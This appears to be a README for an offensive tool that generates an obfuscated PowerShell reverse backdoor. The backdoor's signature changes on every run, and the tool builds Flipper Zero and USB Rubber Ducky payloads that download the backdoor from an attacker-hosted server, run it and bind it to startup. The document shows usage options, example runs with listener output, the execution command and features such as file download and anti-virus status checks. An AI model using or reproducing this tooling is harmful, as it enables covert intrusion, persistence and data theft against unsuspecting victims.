# powershell-backdoor
Reverse backdoor written in Powershell and obfuscated with Python. Allowing the backdoor to have a new signature after every run. Also can generate auto run scripts for Flipper Zero and USB Rubber Ducky.
```
usage: listen.py [-h] [--ip-address IP_ADDRESS] [--port PORT] [--random] [--out OUT] [--verbose] [--delay DELAY] [--flipper FLIPPER] [--ducky]
                 [--server-port SERVER_PORT] [--payload PAYLOAD] [--list--payloads] [-k KEYBOARD] [-L] [-H]

Powershell Backdoor Generator

options:
  -h, --help            show this help message and exit
  --ip-address IP_ADDRESS, -i IP_ADDRESS
                        IP Address to bind the backdoor too (default: 192.168.X.XX)
  --port PORT, -p PORT  Port for the backdoor to connect over (default: 4444)
  --random, -r          Randomizes the outputed backdoor's file name
  --out OUT, -o OUT     Specify the backdoor filename (relative file names)
  --verbose, -v         Show verbose output
  --delay DELAY         Delay in milliseconds before Flipper Zero/Ducky-Script payload execution (default:100)
  --flipper FLIPPER     Payload file for flipper zero (includes EOL conversion) (relative file name)
  --ducky               Creates an inject.bin for the http server
  --server-port SERVER_PORT
                        Port to run the HTTP server on (--server) (default: 8080)
  --payload PAYLOAD     USB Rubber Ducky/Flipper Zero backdoor payload to execute
  --list--payloads      List all available payloads
  -k KEYBOARD, --keyboard KEYBOARD
                        Keyboard layout for Bad Usb/Flipper Zero (default: us)
  -A, --actually-listen
                        Just listen for any backdoor connections
  -H, --listen-and-host
                        Just listen for any backdoor connections and host the backdoor directory
```
# Quick Links
* [Preview](#preview)
* [Features](#features)
* [Standard Backdoor](#standard-backdoor)
* [Flipper Zero Backdoor](#flipper-zero-backdoor)
* [USB Rubber Ducky Backdoor](#usb-rubber-ducky-backdoor)
* [Thanks](#thanks)
* [To Do](#to-do)

## Preview
![preview](/images/preview.PNG)
<br>

## Features
* Hak5 Rubber Ducky payload
* Flipper Zero payload
* Download Files from remote system
* Fetch target computers public IP address
* List local users
* Find Intresting Files
* Get OS Information
* Get BIOS Information
* Get Anti-Virus Status
* Get Active TCP Clients
* Checks for common pentesting software installed

## Standard backdoor
``` bash
C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --verbose
[*] Encoding backdoor script
[*] Saved backdoor backdoor.ps1 sha1:32b9ca5c3cd088323da7aed161a788709d171b71
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```
A file in the current working directory will be created called backdoor.ps1

# Bad USB/ USB Rubber Ducky attacks
When using any of these attacks you will be opening up a HTTP server hosting the backdoor. Once the backdoor is retrieved the HTTP server will be shutdown.

## Payloads
   * Execute -- Execute the backdoor 
   * BindAndExecute -- Place the backdoor in temp, bind the backdoor to startup and then execute it.
## Flipper Zero Backdoor
```
C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --flipper powershell_backdoor.txt --payload execute
[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```
Place the text file you specified (e.g: powershell_backdoor.txt) into your flipper zero. When the payload is executed 
it will download and execute backdoor.ps1

## Usb Rubber Ducky Backdoor
```
 C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --ducky --payload BindAndExecute
[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```
A file named inject.bin will be placed in your current working directory. Java is required for this feature. When the payload is executed 
it will download and execute backdoor.ps1

## Thanks
To encode payload.txt into inject.bin for USB Rubber Ducky Attacks I use encoder.jar created by ![midnitesnake](https://github.com/midnitesnake).

## Backdoor Execution
Tested on Windows 11, Windows 10 and Kali Linux
```cmd
powershell.exe -File backdoor.ps1 -ExecutionPolicy Unrestricted
```
```cmd
┌──(drew㉿kali)-[/home/drew/Documents]
└─PS> ./backdoor.ps1
```

## To Do 
* Add Standard Backdoor
* Find Writeable Directories
* Get Windows Update Status

## Output of 5 obfuscations/Runs 
```
sha1:c7a5fa3e56640ce48dcc3e8d972e444d9cdd2306
sha1:b32dab7b26cdf6b9548baea6f3cfe5b8f326ceda
sha1:e49ab36a7ad6b9fc195b4130164a508432f347db
sha1:ba40fa061a93cf2ac5b6f2480f6aab4979bd211b
sha1:f2e43320403fb11573178915b7e1f258e7c1b3f0
```
